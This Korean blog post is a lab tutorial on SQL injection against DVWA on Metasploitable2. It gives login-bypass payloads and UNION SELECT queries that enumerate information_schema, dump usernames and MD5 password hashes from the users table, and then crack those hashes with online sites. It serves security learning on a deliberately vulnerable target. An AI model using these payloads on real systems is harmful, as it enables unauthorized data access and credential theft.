---
title:  "웹 보안 - SQL Injection 개념 및 실습"
excerpt: "DVWA를 활용한 SQL Injection 실습"

comments: true
categories: web-security
tags: [sql-injection, dvwa]
toc: true
toc_sticky: true
 
date: 2022-05-04-22:05
last_modified_at: 2022-05-04
---

### SQL Injection 원리
* * *
1. 로직이 참이 되도록 함 : and, or
   - True and false = False
   - True or False = True
   - ' or 'a'='a

2. 주석처리 : 뒤에 처리되지 않고 남는 부분에 SQL 에러를 발생시킴 --> 주석처리로 무효화
   - Oracle, MS-SQL : --
   - MySQL, MariaDB : #
   - ' or 1=1--
   - ' or 1=1 #

3. 중첩문을 사용
   - 앞에 SELECT 문이 있으면 UNION SELECT 로 이어가는 방법
   - 앞에 SELECT 문이 있는데 UPDATE 문을 사용해서 

### DVWA 실습
* * *
#### 환경세팅
1. VMWare Player 에서 metasploitable2 실행
2. metasploitable2 의 ip를 web brower 주소창에 입력
3. DVWA 클릭
4. DVWA Security > security level > low로 설정

#### SQL injection 탭에서 한번에 다 출력 되도록 해보기
- 1, 2, 3, 4, 5 순서대로 입력해보기

**sql 문을 유추해보기**

- select firstname, surname from ~~ where id = '~'
- 뒤에 있는 single quotes를 닫아버리고 or 연산으로 무조건 true로 만들기

**(방법 1) 주석을 이용**

- ' or 1=1 #
- ' or 2=2 #

![](../../assets/images/20220531-024740.png){: .center}

**(방법 2) 뒤에 있을 single quotes 활용**

- ' or 'a'='a

![](../../assets/images/20220531-024745.png){: .center}

#### 로그인에 필요한 ID 와 Password 알아내기

- select 문을 자유자재로 써야하기 때문에 UNION SELECT를 이용할거임.
- **필요한 정보**
  - user가 저장된 table 명
  - id, password 가 들어갈 column 명

cf.union select 는 기존 select 문과 칼럼수가 동일해야 함
##### 1. DB 이름 알아내기

```sql
' union select database(),null #
```

![](../../assets/images/20220531-025134.png){: .center}

- Database 이름 : **dvwa**

##### 2. Table 이름 알아내기

- 알아낸 Database 이름으로 mysql, mariadb의 전반적인 정보가 모두 담겨있는 information_schema Database를 이용하여 알아낼거임.
- 이때 information_schema.tables 에서 " . " 의 의미는 지금 dvwa 데이터베이스에 있으므로 명확하게 database 이름을 정해주고 해당 데이터베이스 안의 'tables'라는 테이블에 접근해야 함.

```sql
' union select table_name,null from information_schema.tables where table_schema = 'dvwa' #
```

![](../../assets/images/20220531-025316.png){: .center}

##### 3. Column 목록 조회

- 위에서 알아낸 table명 중 가장 그럴싸한 users 테이블로 결정
- 여기서도 information_schema.columns 테이블에서 table_name이 users인  column_name 을 조회 
- 이를 sql로 나타내면 아래와 같다.

```sql
' union select column_name, null from information_schema.columns where table_name='users' #
```

![](../../assets/images/20220531-025628.png){: .center}

- ID가 들어있을 법한 column : user,
- password가 들어있을 법한 column : password

##### 4. users table 에서 id, password 조회

- 위의 과정을 통해 테이블 정보, id가 들어있을 칼럼, password가 들어있을 칼럼을 모두 알아냈으므로 아주 간단한 select문을 사용할 수 있다.

```sql
' union select user, password from users #
```

![](../../assets/images/20220531-025714.png){: .center}

**GOOD!**
- 아이디와 패스워드 모두 알아냈다.
- 이제 확인만 해보면 되는데... 비밀번호가 이상한 값이다.
- 이는 DB에서 비밀번호를 저장할때 해쉬함수로 변환해서 저장하기 때문이다.
- 먼저 어떤 해쉬 함수를 사용했는지 유추할 필요가 있는데
- 해쉬 함수의 특징 중 하나인 모든 해쉬값의 길이가 일정하다는건데, 
- 해쉬 함수들의 길이를 한번 되새겨보자.

<https://ssy02060.github.io/cryptograpy/hash-fucntion/>

- MD5 : 128 bit
- SHA1 : 160 bit
- SHA2-256 : 256 bit
- 해쉬함수의 대한 자세한 내용은 아래 링크 참고

- admin 의 password 해쉬 값은 5f4dcc3b5aa765d61d8327deb882cf99 으로 32자 이다.
- HEX 값은 한글자 당 4bit이고, 32자이므로 4*32 = 128bit 임을 알 수 있다.
- 결론 : md5 해쉬함수로 변환되었음을 알 수 있다.

**해쉬 값을 크래킹해주는 사이트**
<https://hashes.com/en/decrypt/hash>
<https://crackstation.net/>

![](../../assets/images/20220531-030211.png){: .center}

- 여기서 구한 비밀번호 평문과 ID로 DVWA의 Brute Force 탭에 로그인을 하면 아래와 같이 Welcome to 로 환영해주는 것을 알 수 있다.

![](../../assets/images/20220531-030216.png){: .center}

**GOOD!**